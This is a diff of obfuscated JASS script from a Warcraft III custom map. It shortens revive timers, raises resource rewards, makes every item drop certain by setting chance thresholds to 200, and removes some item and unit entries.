 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6555,7 +7713,7 @@ endfunction
 function of takes nothing returns nothing
 call CreateTimerDialogBJ(rv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set iv=bj_lastCreatedTimerDialog
-call StartTimerBJ(rv,false,15.)
+call StartTimerBJ(rv,false,3.)
 call TimerDialogDisplay(iv,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6567,7 +7725,7 @@ endfunction
 function nf takes nothing returns nothing
 call CreateTimerDialogBJ(av,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set nv=bj_lastCreatedTimerDialog
-call StartTimerBJ(av,false,15.)
+call StartTimerBJ(av,false,3.)
 call TimerDialogDisplay(nv,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6579,7 +7737,7 @@ endfunction
 function Xf takes nothing returns nothing
 call CreateTimerDialogBJ(Vv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set Ev=bj_lastCreatedTimerDialog
-call StartTimerBJ(Vv,false,15.)
+call StartTimerBJ(Vv,false,3.)
 call TimerDialogDisplay(Ev,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6591,7 +7749,7 @@ endfunction
 function If takes nothing returns nothing
 call CreateTimerDialogBJ(Xv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set Ov=bj_lastCreatedTimerDialog
-call StartTimerBJ(Xv,false,15.)
+call StartTimerBJ(Xv,false,3.)
 call TimerDialogDisplay(Ov,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6603,7 +7761,7 @@ endfunction
 function bf takes nothing returns nothing
 call CreateTimerDialogBJ(Rv,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set Iv=bj_lastCreatedTimerDialog
-call StartTimerBJ(Rv,false,15.)
+call StartTimerBJ(Rv,false,3.)
 call TimerDialogDisplay(Iv,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6615,7 +7773,7 @@ endfunction
 function Cf takes nothing returns nothing
 call CreateTimerDialogBJ(Av,GetPlayerName(GetOwningPlayer(GetDyingUnit())))
 set Nv=bj_lastCreatedTimerDialog
-call StartTimerBJ(Av,false,15.)
+call StartTimerBJ(Av,false,3.)
 call TimerDialogDisplay(Nv,true)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),bj_FORCE_ALL_PLAYERS,3)
 call SetForceAllianceStateBJ(FA(GetOwningPlayer(GetTriggerUnit())),FA(Player($B)),0)
@@ -6718,8 +7876,8 @@ function Zf takes nothing returns boolean
 return(GetUnitAbilityLevelSwapped('A06J',K[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))])==1)
 endfunction
 function vF takes nothing returns nothing
-set G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=(G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]+5)
-call AdjustPlayerStateBJ(5,GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER)
+set G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=(G[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]+50)
+call AdjustPlayerStateBJ(50,GetOwningPlayer(GetTriggerUnit()),PLAYER_STATE_RESOURCE_LUMBER)
 if(Zf())then
 set rx[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]=(rx[(1+GetPlayerId(GetOwningPlayer(GetTriggerUnit())))]+1)
 if(zf())then
@@ -7601,7 +8759,7 @@ loop
 exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
 set pv[0]=Mv[bj_forLoopAIndex]
 set bj_forLoopBIndex=1
-set bj_forLoopBIndexEnd=44
+set bj_forLoopBIndexEnd=43
 loop
 exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
 if(bH())then
@@ -7709,10 +8867,6 @@ set wv[42]=5000
 set Wv[42]='H01Z'
 set wv[43]=50000
 set Wv[43]='H020'
-set wv[44]=5000
-set Wv[44]='H021'
-set wv[45]=1000000000
-set Wv[45]='H022'
 endfunction
 function DH takes nothing returns boolean
 return(GetSpellAbilityId()=='A00G')
@@ -8478,15 +9632,13 @@ set Ye[18]='I075'
 set ye[19]='I05Q'
 set Ye[19]='I076'
 set ye[20]='I05R'
-set Ye[20]='I0AC'
-set ye[21]='I0B0'
 endfunction
 function RJ takes nothing returns boolean
 return(Ye[bj_forLoopBIndex]==GetItemTypeId(GetManipulatedItem()))and(UnitHasItemOfTypeBJ(GetTriggerUnit(),ye[bj_forLoopBIndex]))
 endfunction
 function IJ takes nothing returns nothing
 set bj_forLoopBIndex=1
-set bj_forLoopBIndexEnd=20
+set bj_forLoopBIndexEnd=19
 loop
 exitwhen bj_forLoopBIndex>bj_forLoopBIndexEnd
 if(RJ())then
@@ -8621,7 +9773,6 @@ if(TJ())then
 set mv='d'
 set tv[(1+GetPlayerId(GetOwningPlayer(GetSpellAbilityUnit())))]=(tv[(1+GetPlayerId(GetOwningPlayer(GetSpellAbilityUnit())))]+mv)
 call AdjustPlayerStateBJ(mv,GetOwningPlayer(GetSpellAbilityUnit()),PLAYER_STATE_RESOURCE_GOLD)
-
 endif
 endfunction
 function wJ takes nothing returns boolean
@@ -8756,19 +9907,19 @@ function dk takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n00R')
 endfunction
 function Dk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function fk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Fk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Gk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function hk takes nothing returns boolean
 return(RectContainsUnit(Tx,uv))
@@ -8813,19 +9964,19 @@ function Jk takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n00Y')
 endfunction
 function kk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Kk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function lk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Lk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function mk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Mk takes nothing returns boolean
 return(RectContainsUnit(ux,uv))
@@ -8876,16 +10027,16 @@ function qk takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n00Z')
 endfunction
 function Qk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Sk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=60.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function tk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Tk takes nothing returns boolean
 return(RectContainsUnit(Ux,uv))
@@ -8932,22 +10083,22 @@ function wk takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n00X')
 endfunction
 function Wk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function yk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Yk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function zk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Zk takes nothing returns boolean
-return(GetRandomReal(0,'d')<=70.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function vK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function eK takes nothing returns boolean
 return(RectContainsUnit(wx,uv))
@@ -9002,16 +10153,16 @@ function rK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n010')
 endfunction
 function iK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=45.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function aK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function nK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function VK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function EK takes nothing returns boolean
 return(RectContainsUnit(Wx,uv))
@@ -9052,16 +10203,16 @@ function RK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n011')
 endfunction
 function IK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=65.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function AK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function NK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=40.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function bK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=40.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function BK takes nothing returns boolean
 return(RectContainsUnit(yx,uv))
@@ -9102,19 +10253,19 @@ function dK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n012')
 endfunction
 function DK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=80.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function fK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function FK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=35.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function GK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=40.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function hK takes nothing returns boolean
 return(RectContainsUnit(Yx,uv))
@@ -9159,19 +10310,19 @@ function JK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n013')
 endfunction
 function kK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=40.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function KK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=55.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function lK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function LK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function mK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function MK takes nothing returns boolean
 return(RectContainsUnit(zx,uv))
@@ -9216,25 +10367,25 @@ function qK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n014')
 endfunction
 function QK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=60.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function SK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function tK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=30.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function TK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function uK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function UK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.2)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wK takes nothing returns boolean
 return(RectContainsUnit(Zx,uv))
@@ -9288,25 +10439,25 @@ function YK takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n016')
 endfunction
 function zK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ZK takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function vl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function el takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function xl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ol takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.2)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function il takes nothing returns boolean
 return(RectContainsUnit(wo,uv))
@@ -9360,19 +10511,19 @@ function Vl takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n01E')
 endfunction
 function El takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Xl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=75.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ol takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Rl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.2)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Il takes nothing returns boolean
-return(GetRandomReal(0,'d')<=.2)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Al takes nothing returns boolean
 return(RectContainsUnit(Hr,uv))
@@ -9418,7 +10569,7 @@ function Bl takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n01G')
 endfunction
 function cl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Cl takes nothing returns boolean
 return(RectContainsUnit(lr,uv))
@@ -9448,13 +10599,13 @@ function fl takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n01Q')
 endfunction
 function Fl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Gl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function hl takes nothing returns boolean
 return(RectContainsUnit(xi,uv))
@@ -9492,16 +10643,16 @@ function Jl takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n020')
 endfunction
 function kl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Kl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ll takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ll takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function ml takes nothing returns boolean
 return(RectContainsUnit(oi,uv))
@@ -9541,13 +10692,13 @@ function Pl takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n021')
 endfunction
 function ql takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Ql takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Sl takes nothing returns boolean
 return(RectContainsUnit(ri,uv))
@@ -9584,16 +10735,16 @@ function ul takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n022')
 endfunction
 function Ul takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Wl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function yl takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Yl takes nothing returns boolean
 return(RectContainsUnit(ii,uv))
@@ -9634,16 +10785,16 @@ function vL takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n023')
 endfunction
 function eL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function xL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function oL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function iL takes nothing returns boolean
 return(RectContainsUnit(ai,uv))
@@ -9684,16 +10835,16 @@ function VL takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n03J')
 endfunction
 function EL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function XL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function OL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function RL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function IL takes nothing returns boolean
 return(RectContainsUnit(ni,uv))
@@ -9729,16 +10880,16 @@ function CL takes nothing returns boolean
 return(mv==1)
 endfunction
 function dL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function DL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function fL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=20.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function FL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function gL takes nothing returns boolean
 return(RectContainsUnit(Vi,uv))
@@ -9790,16 +10941,16 @@ function HL takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02H')
 endfunction
 function jL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function JL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function kL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function KL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function lL takes nothing returns boolean
 return(RectContainsUnit(Xi,uv))
@@ -9840,19 +10991,19 @@ function ML takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02I')
 endfunction
 function pL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function PL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function qL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function QL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function SL takes nothing returns boolean
 return(RectContainsUnit(Ri,uv))
@@ -9897,19 +11048,19 @@ function uL takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02J')
 endfunction
 function UL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function WL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function yL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function YL takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function zL takes nothing returns boolean
 return(RectContainsUnit(Oi,uv))
@@ -9954,19 +11105,19 @@ function em takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02M')
 endfunction
 function xm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function om takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function rm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function im takes nothing returns boolean
-return(GetRandomReal(0,'d')<=15.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function am takes nothing returns boolean
-return(GetRandomReal(0,'d')<=30.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function nm takes nothing returns boolean
 return(RectContainsUnit(Ai,uv))
@@ -10011,16 +11162,16 @@ function Xm takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02N')
 endfunction
 function Om takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Rm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Im takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Am takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Nm takes nothing returns boolean
 return(RectContainsUnit(Bi,uv))
@@ -10062,16 +11213,16 @@ function cm takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02V')
 endfunction
 function Cm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function dm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Dm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function fm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Fm takes nothing returns boolean
 return(RectContainsUnit(ci,uv))
@@ -10113,16 +11264,16 @@ function hm takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02W')
 endfunction
 function Hm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function jm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Jm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function km takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Km takes nothing returns boolean
 return(RectContainsUnit(Ci,uv))
@@ -10164,19 +11315,19 @@ function mm takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02X')
 endfunction
 function Mm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function pm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Pm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=5.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function qm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=50.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Qm takes nothing returns boolean
-return(GetRandomReal(0,'d')<=25.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function sm takes nothing returns boolean
 return(RectContainsUnit(di,uv))
@@ -10219,31 +11370,6 @@ call SetUnitPositionLoc(uv,GetRectCenter(Tv[bj_forLoopAIndex]))
 call CreateItemLoc('I0AY',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 call CreateItemLoc('I0AZ',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I07V',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
-call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
-endif
-set bj_forLoopAIndex=bj_forLoopAIndex+1
-endloop
-endfunction
-function herculesreg takes nothing returns boolean
-return(RectContainsUnit(herculesdropregion,uv))
-endfunction
-function herculesdropAction takes nothing returns nothing
-set bj_forLoopAIndex=1
-set bj_forLoopAIndexEnd=9
-loop
-exitwhen bj_forLoopAIndex>bj_forLoopAIndexEnd
-set uv=K[bj_forLoopAIndex]
-if(herculesreg())then
-call SetUnitPositionLoc(uv,GetRectCenter(Tv[bj_forLoopAIndex]))
-call CreateItemLoc('I0B3',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I0B4',GetRectCenter(Tv[bj_forLoopAIndex]))
-call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
-call CreateItemLoc('I07W',GetRectCenter(Tv[bj_forLoopAIndex]))
 call SetItemUserData(bj_lastCreatedItem,bj_forLoopAIndex)
 set gx[(1+GetPlayerId(GetOwningPlayer(uv)))]=(gx[(1+GetPlayerId(GetOwningPlayer(uv)))]+1)
 call PanCameraToTimedLocForPlayer(Player(-1+(bj_forLoopAIndex)),GetRectCenter(Tv[bj_forLoopAIndex]),0)
@@ -10316,19 +11442,19 @@ function Tm takes nothing returns boolean
 return(GetUnitTypeId(GetDyingUnit())=='n02Y')
 endfunction
 function um takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function Um takes nothing returns boolean
-return(GetRandomReal(0,'d')<=10.)
+return(GetRandomReal(0,'d')<=200.)
 endfunction
 function wm takes nothing returns boolean
